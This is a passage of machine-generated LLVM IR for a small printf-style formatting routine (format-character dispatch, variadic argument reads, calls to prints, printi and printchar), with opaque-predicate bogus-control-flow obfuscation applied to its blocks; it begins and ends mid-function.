  %166 = load i32, i32* @x.7
  %167 = load i32, i32* @y.8
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %175

; <label>:174:                                    ; preds = %originalBBpart28
  br label %175

; <label>:175:                                    ; preds = %174, %originalBBpart212
  %176 = phi i8* [ %165, %originalBBpart212 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.117, i32 0, i32 0), %174 ]
  %177 = load i32, i32* %7, align 4
  %178 = load i32, i32* %8, align 4
  %179 = call i32 @prints(i8** %145, i8* %176, i32 %177, i32 %178)
  %180 = load i32, i32* %9, align 4
  %181 = add nsw i32 %180, %179
  store i32 %181, i32* %9, align 4
  br label %522

; <label>:182:                                    ; preds = %96
  %183 = load i8*, i8** %5, align 8
  %184 = load i8, i8* %183, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 100
  br i1 %186, label %187, label %228

; <label>:187:                                    ; preds = %182
  %188 = load i8**, i8*** %4, align 8
  %189 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %190 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 8
  %192 = icmp ule i32 %191, 40
  br i1 %192, label %193, label %199

; <label>:193:                                    ; preds = %187
  %194 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %189, i32 0, i32 3
  %195 = load i8*, i8** %194, align 8
  %196 = getelementptr i8, i8* %195, i32 %191
  %197 = bitcast i8* %196 to i32*
  %198 = add i32 %191, 8
  store i32 %198, i32* %190, align 8
  br label %220

; <label>:199:                                    ; preds = %187
  %200 = load i32, i32* @x.7
  %201 = load i32, i32* @y.8
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %199
  %208 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %189, i32 0, i32 2
  %209 = load i8*, i8** %208, align 8
  %210 = bitcast i8* %209 to i32*
  %211 = getelementptr i8, i8* %209, i32 8
  store i8* %211, i8** %208, align 8
  %212 = load i32, i32* @x.7
  %213 = load i32, i32* @y.8
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %220

; <label>:220:                                    ; preds = %originalBBpart216, %193
  %221 = phi i32* [ %197, %193 ], [ %210, %originalBBpart216 ]
  %222 = load i32, i32* %221, align 4
  %223 = load i32, i32* %7, align 4
  %224 = load i32, i32* %8, align 4
  %225 = call i32 @printi(i8** %188, i32 %222, i32 10, i32 1, i32 %223, i32 %224, i32 97)
  %226 = load i32, i32* %9, align 4
  %227 = add nsw i32 %226, %225
  store i32 %227, i32* %9, align 4
  br label %522

; <label>:228:                                    ; preds = %182
  %229 = load i8*, i8** %5, align 8
  %230 = load i8, i8* %229, align 1
  %231 = zext i8 %230 to i32
  %232 = icmp eq i32 %231, 120
  br i1 %232, label %233, label %274

; <label>:233:                                    ; preds = %228
  %234 = load i8**, i8*** %4, align 8
  %235 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %236 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %235, i32 0, i32 0
  %237 = load i32, i32* %236, align 8
  %238 = icmp ule i32 %237, 40
  br i1 %238, label %239, label %261

; <label>:239:                                    ; preds = %233
  %240 = load i32, i32* @x.7
  %241 = load i32, i32* @y.8
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %239
  %248 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %235, i32 0, i32 3
  %249 = load i8*, i8** %248, align 8
  %250 = getelementptr i8, i8* %249, i32 %237
  %251 = bitcast i8* %250 to i32*
  %252 = add i32 %237, 8
  store i32 %252, i32* %236, align 8
  %253 = load i32, i32* @x.7
  %254 = load i32, i32* @y.8
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBBpart223, label %originalBB18alteredBB

originalBBpart223:                                ; preds = %originalBB18
  br label %266

; <label>:261:                                    ; preds = %233
  %262 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %235, i32 0, i32 2
  %263 = load i8*, i8** %262, align 8
  %264 = bitcast i8* %263 to i32*
  %265 = getelementptr i8, i8* %263, i32 8
  store i8* %265, i8** %262, align 8
  br label %266

; <label>:266:                                    ; preds = %261, %originalBBpart223
  %267 = phi i32* [ %251, %originalBBpart223 ], [ %264, %261 ]
  %268 = load i32, i32* %267, align 4
  %269 = load i32, i32* %7, align 4
  %270 = load i32, i32* %8, align 4
  %271 = call i32 @printi(i8** %234, i32 %268, i32 16, i32 0, i32 %269, i32 %270, i32 97)
  %272 = load i32, i32* %9, align 4
  %273 = add nsw i32 %272, %271
  store i32 %273, i32* %9, align 4
  br label %522

; <label>:274:                                    ; preds = %228
  %275 = load i32, i32* @x.7
  %276 = load i32, i32* @y.8
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %274
  %283 = load i8*, i8** %5, align 8
  %284 = load i8, i8* %283, align 1
  %285 = zext i8 %284 to i32
  %286 = icmp eq i32 %285, 88
  %287 = load i32, i32* @x.7
  %288 = load i32, i32* @y.8
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %286, label %295, label %368

; <label>:295:                                    ; preds = %originalBBpart227
  %296 = load i32, i32* @x.7
  %297 = load i32, i32* @y.8
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %295
  %304 = load i8**, i8*** %4, align 8
  %305 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %306 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 8
  %308 = icmp ule i32 %307, 40
  %309 = load i32, i32* @x.7
  %310 = load i32, i32* @y.8
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %308, label %317, label %339

; <label>:317:                                    ; preds = %originalBBpart231
  %318 = load i32, i32* @x.7
  %319 = load i32, i32* @y.8
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %317
  %326 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %305, i32 0, i32 3
  %327 = load i8*, i8** %326, align 8
  %328 = getelementptr i8, i8* %327, i32 %307
  %329 = bitcast i8* %328 to i32*
  %330 = add i32 %307, 8
  store i32 %330, i32* %306, align 8
  %331 = load i32, i32* @x.7
  %332 = load i32, i32* @y.8
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBBpart239, label %originalBB33alteredBB

originalBBpart239:                                ; preds = %originalBB33
  br label %360

; <label>:339:                                    ; preds = %originalBBpart231
  %340 = load i32, i32* @x.7
  %341 = load i32, i32* @y.8
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %339
  %348 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %305, i32 0, i32 2
  %349 = load i8*, i8** %348, align 8
  %350 = bitcast i8* %349 to i32*
  %351 = getelementptr i8, i8* %349, i32 8
  store i8* %351, i8** %348, align 8
  %352 = load i32, i32* @x.7
  %353 = load i32, i32* @y.8
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %360

; <label>:360:                                    ; preds = %originalBBpart243, %originalBBpart239
  %361 = phi i32* [ %329, %originalBBpart239 ], [ %350, %originalBBpart243 ]
  %362 = load i32, i32* %361, align 4
  %363 = load i32, i32* %7, align 4
  %364 = load i32, i32* %8, align 4
  %365 = call i32 @printi(i8** %304, i32 %362, i32 16, i32 0, i32 %363, i32 %364, i32 65)
  %366 = load i32, i32* %9, align 4
  %367 = add nsw i32 %366, %365
  store i32 %367, i32* %9, align 4
  br label %522

; <label>:368:                                    ; preds = %originalBBpart227
  %369 = load i8*, i8** %5, align 8
  %370 = load i8, i8* %369, align 1
  %371 = zext i8 %370 to i32
  %372 = icmp eq i32 %371, 117
  br i1 %372, label %373, label %398

; <label>:373:                                    ; preds = %368
  %374 = load i8**, i8*** %4, align 8
  %375 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %376 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %375, i32 0, i32 0
  %377 = load i32, i32* %376, align 8
  %378 = icmp ule i32 %377, 40
  br i1 %378, label %379, label %385

; <label>:379:                                    ; preds = %373
  %380 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %375, i32 0, i32 3
  %381 = load i8*, i8** %380, align 8
  %382 = getelementptr i8, i8* %381, i32 %377
  %383 = bitcast i8* %382 to i32*
  %384 = add i32 %377, 8
  store i32 %384, i32* %376, align 8
  br label %390

; <label>:385:                                    ; preds = %373
  %386 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %375, i32 0, i32 2
  %387 = load i8*, i8** %386, align 8
  %388 = bitcast i8* %387 to i32*
  %389 = getelementptr i8, i8* %387, i32 8
  store i8* %389, i8** %386, align 8
  br label %390

; <label>:390:                                    ; preds = %385, %379
  %391 = phi i32* [ %383, %379 ], [ %388, %385 ]
  %392 = load i32, i32* %391, align 4
  %393 = load i32, i32* %7, align 4
  %394 = load i32, i32* %8, align 4
  %395 = call i32 @printi(i8** %374, i32 %392, i32 10, i32 0, i32 %393, i32 %394, i32 97)
  %396 = load i32, i32* %9, align 4
  %397 = add nsw i32 %396, %395
  store i32 %397, i32* %9, align 4
  br label %522

; <label>:398:                                    ; preds = %368
  %399 = load i32, i32* @x.7
  %400 = load i32, i32* @y.8
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %398
  %407 = load i8*, i8** %5, align 8
  %408 = load i8, i8* %407, align 1
  %409 = zext i8 %408 to i32
  %410 = icmp eq i32 %409, 99
  %411 = load i32, i32* @x.7
  %412 = load i32, i32* @y.8
  %413 = sub i32 %411, 1
  %414 = mul i32 %411, %413
  %415 = urem i32 %414, 2
  %416 = icmp eq i32 %415, 0
  %417 = icmp slt i32 %412, 10
  %418 = or i1 %416, %417
  br i1 %418, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %410, label %419, label %480

; <label>:419:                                    ; preds = %originalBBpart247
  %420 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %421 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 8
  %423 = icmp ule i32 %422, 40
  br i1 %423, label %424, label %446

; <label>:424:                                    ; preds = %419
  %425 = load i32, i32* @x.7
  %426 = load i32, i32* @y.8
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %424
  %433 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %420, i32 0, i32 3
  %434 = load i8*, i8** %433, align 8
  %435 = getelementptr i8, i8* %434, i32 %422
  %436 = bitcast i8* %435 to i32*
  %437 = add i32 %422, 8
  store i32 %437, i32* %421, align 8
  %438 = load i32, i32* @x.7
  %439 = load i32, i32* @y.8
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBBpart253, label %originalBB49alteredBB

originalBBpart253:                                ; preds = %originalBB49
  br label %451

; <label>:446:                                    ; preds = %419
  %447 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %420, i32 0, i32 2
  %448 = load i8*, i8** %447, align 8
  %449 = bitcast i8* %448 to i32*
  %450 = getelementptr i8, i8* %448, i32 8
  store i8* %450, i8** %447, align 8
  br label %451

; <label>:451:                                    ; preds = %446, %originalBBpart253
  %452 = phi i32* [ %436, %originalBBpart253 ], [ %449, %446 ]
  %453 = load i32, i32* @x.7
  %454 = load i32, i32* @y.8
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %451
  %461 = load i32, i32* %452, align 4
  %462 = trunc i32 %461 to i8
  %463 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %462, i8* %463, align 1
  %464 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %464, align 1
  %465 = load i8**, i8*** %4, align 8
  %466 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %467 = load i32, i32* %7, align 4
  %468 = load i32, i32* %8, align 4
  %469 = call i32 @prints(i8** %465, i8* %466, i32 %467, i32 %468)
  %470 = load i32, i32* %9, align 4
  %471 = add nsw i32 %470, %469
  store i32 %471, i32* %9, align 4
  %472 = load i32, i32* @x.7
  %473 = load i32, i32* @y.8
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBBpart262, label %originalBB55alteredBB

originalBBpart262:                                ; preds = %originalBB55
  br label %522

; <label>:480:                                    ; preds = %originalBBpart247
  %481 = load i32, i32* @x.7
  %482 = load i32, i32* @y.8
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %480
  %489 = load i32, i32* @x.7
  %490 = load i32, i32* @y.8
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %521

; <label>:497:                                    ; preds = %17
  br label %498

; <label>:498:                                    ; preds = %497, %35
  %499 = load i32, i32* @x.7
  %500 = load i32, i32* @y.8
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %498
  %507 = load i8**, i8*** %4, align 8
  %508 = load i8*, i8** %5, align 8
  %509 = load i8, i8* %508, align 1
  %510 = zext i8 %509 to i32
  call void @printchar(i8** %507, i32 %510)
  %511 = load i32, i32* %9, align 4
  %512 = add nsw i32 %511, 1
  store i32 %512, i32* %9, align 4
  %513 = load i32, i32* @x.7
  %514 = load i32, i32* @y.8
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBBpart271, label %originalBB68alteredBB

originalBBpart271:                                ; preds = %originalBB68
  br label %521

; <label>:521:                                    ; preds = %originalBBpart271, %originalBBpart266
  br label %522

; <label>:522:                                    ; preds = %521, %originalBBpart262, %390, %360, %266, %220, %175
  %523 = load i8*, i8** %5, align 8
  %524 = getelementptr inbounds i8, i8* %523, i32 1
  store i8* %524, i8** %5, align 8
  br label %12

; <label>:525:                                    ; preds = %29, %12
  %526 = load i32, i32* @x.7
  %527 = load i32, i32* @y.8
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %525
  %534 = load i8**, i8*** %4, align 8
  %535 = icmp ne i8** %534, null
  %536 = load i32, i32* @x.7
  %537 = load i32, i32* @y.8
  %538 = sub i32 %536, 1
  %539 = mul i32 %536, %538
  %540 = urem i32 %539, 2
  %541 = icmp eq i32 %540, 0
  %542 = icmp slt i32 %537, 10
  %543 = or i1 %541, %542
  br i1 %543, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %535, label %544, label %563

; <label>:544:                                    ; preds = %originalBBpart275
  %545 = load i32, i32* @x.7
  %546 = load i32, i32* @y.8
  %547 = sub i32 %545, 1
  %548 = mul i32 %545, %547
  %549 = urem i32 %548, 2
  %550 = icmp eq i32 %549, 0
  %551 = icmp slt i32 %546, 10
  %552 = or i1 %550, %551
  br i1 %552, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %544
  %553 = load i8**, i8*** %4, align 8
  %554 = load i8*, i8** %553, align 8
  store i8 0, i8* %554, align 1
  %555 = load i32, i32* @x.7
  %556 = load i32, i32* @y.8
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br label %563

; <label>:563:                                    ; preds = %originalBBpart279, %originalBBpart275
  %564 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %565 = bitcast %struct.__va_list_tag* %564 to i8*
  call void @llvm.va_end(i8* %565)
  %566 = load i32, i32* %9, align 4
  ret i32 %566

originalBBalteredBB:                              ; preds = %originalBB, %61
  %567 = load i8*, i8** %5, align 8
  %568 = load i8, i8* %567, align 1
  %569 = zext i8 %568 to i32
  %570 = icmp sle i32 %569, 57
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %112
  %571 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %102, i32 0, i32 2
  %572 = load i8*, i8** %571, align 8
  %573 = bitcast i8* %572 to i64*
  %574 = getelementptr i8, i8* %572, i32 8
  store i8* %574, i8** %571, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %133
  %575 = load i64, i64* %134, align 8
  %576 = inttoptr i64 %575 to i8*
  store i8* %576, i8** %11, align 8
  %577 = load i8**, i8*** %4, align 8
  %578 = load i8*, i8** %11, align 8
  %579 = icmp ne i8* %578, null
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %156
  %580 = load i8*, i8** %11, align 8
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %199
  %581 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %189, i32 0, i32 2
  %582 = load i8*, i8** %581, align 8
  %583 = bitcast i8* %582 to i32*
  %584 = getelementptr i8, i8* %582, i32 8
  store i8* %584, i8** %581, align 8
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %239
  %585 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %235, i32 0, i32 3
  %586 = load i8*, i8** %585, align 8
  %587 = getelementptr i8, i8* %586, i32 %237
  %588 = bitcast i8* %587 to i32*
  %_ = sub i32 0, %237
  %gen = add i32 %_, 8
  %_19 = shl i32 %237, 8
  %_20 = sub i32 0, %237
  %gen21 = add i32 %_20, 8
  %589 = add i32 %237, 8
  store i32 %589, i32* %236, align 8
  br label %originalBB18

originalBB25alteredBB:                            ; preds = %originalBB25, %274
  %590 = load i8*, i8** %5, align 8
  %591 = load i8, i8* %590, align 1
  %592 = zext i8 %591 to i32
  %593 = icmp eq i32 %592, 88
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %295
  %594 = load i8**, i8*** %4, align 8
  %595 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %596 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %595, i32 0, i32 0
  %597 = load i32, i32* %596, align 8
  %598 = icmp ule i32 %597, 40
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %317
  %599 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %305, i32 0, i32 3
  %600 = load i8*, i8** %599, align 8
  %601 = getelementptr i8, i8* %600, i32 %307
  %602 = bitcast i8* %601 to i32*
  %_34 = sub i32 0, %307
  %gen35 = add i32 %_34, 8
  %_36 = sub i32 %307, 8
  %gen37 = mul i32 %_36, 8
  %603 = add i32 %307, 8
  store i32 %603, i32* %306, align 8
  br label %originalBB33

originalBB41alteredBB:                            ; preds = %originalBB41, %339
  %604 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %305, i32 0, i32 2
  %605 = load i8*, i8** %604, align 8
  %606 = bitcast i8* %605 to i32*
  %607 = getelementptr i8, i8* %605, i32 8
  store i8* %607, i8** %604, align 8
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %398
  %608 = load i8*, i8** %5, align 8
  %609 = load i8, i8* %608, align 1
  %610 = zext i8 %609 to i32
  %611 = icmp eq i32 %610, 99
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %424
  %612 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %420, i32 0, i32 3
  %613 = load i8*, i8** %612, align 8
  %614 = getelementptr i8, i8* %613, i32 %422
  %615 = bitcast i8* %614 to i32*
  %_50 = sub i32 0, %422
  %gen51 = add i32 %_50, 8
  %616 = add i32 %422, 8
  store i32 %616, i32* %421, align 8
  br label %originalBB49

originalBB55alteredBB:                            ; preds = %originalBB55, %451
  %617 = load i32, i32* %452, align 4
  %618 = trunc i32 %617 to i8
  %619 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %618, i8* %619, align 1
  %620 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %620, align 1
  %621 = load i8**, i8*** %4, align 8
  %622 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %623 = load i32, i32* %7, align 4
  %624 = load i32, i32* %8, align 4
  %625 = call i32 @prints(i8** %621, i8* %622, i32 %623, i32 %624)
  %626 = load i32, i32* %9, align 4
  %_56 = sub i32 %626, %625
  %gen57 = mul i32 %_56, %625
  %_58 = shl i32 %626, %625
  %_59 = sub i32 %626, %625
  %gen60 = mul i32 %_59, %625
  %627 = add nsw i32 %626, %625
  store i32 %627, i32* %9, align 4
  br label %originalBB55

originalBB64alteredBB:                            ; preds = %originalBB64, %480
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %498
  %628 = load i8**, i8*** %4, align 8
  %629 = load i8*, i8** %5, align 8
  %630 = load i8, i8* %629, align 1
  %631 = zext i8 %630 to i32
  call void @printchar(i8** %628, i32 %631)
  %632 = load i32, i32* %9, align 4
  %_69 = shl i32 %632, 1
  %633 = add nsw i32 %632, 1
  store i32 %633, i32* %9, align 4
  br label %originalBB68

originalBB73alteredBB:                            ; preds = %originalBB73, %525
  %634 = load i8**, i8*** %4, align 8
  %635 = icmp ne i8** %634, null
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %544
  %636 = load i8**, i8*** %4, align 8
  %637 = load i8*, i8** %636, align 8
  store i8 0, i8* %637, align 1
  br label %originalBB77
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %122

; <label>:15:                                     ; preds = %4
  %16 = load i32, i32* @x.9
  %17 = load i32, i32* @y.10
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %11, align 4
  %24 = load i8*, i8** %6, align 8
  store i8* %24, i8** %12, align 8
  %25 = load i32, i32* @x.9
  %26 = load i32, i32* @y.10
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart29, %originalBBpart2
  %34 = load i8*, i8** %12, align 8
  %35 = load i8, i8* %34, align 1
  %36 = icmp ne i8 %35, 0
  br i1 %36, label %37, label %75

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* @x.9
  %39 = load i32, i32* @y.10
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* %11, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %11, align 4
  %48 = load i32, i32* @x.9
  %49 = load i32, i32* @y.10
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart25, label %originalBB1alteredBB

originalBBpart25:                                 ; preds = %originalBB1
  br label %56

; <label>:56:                                     ; preds = %originalBBpart25
  %57 = load i32, i32* @x.9
  %58 = load i32, i32* @y.10
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
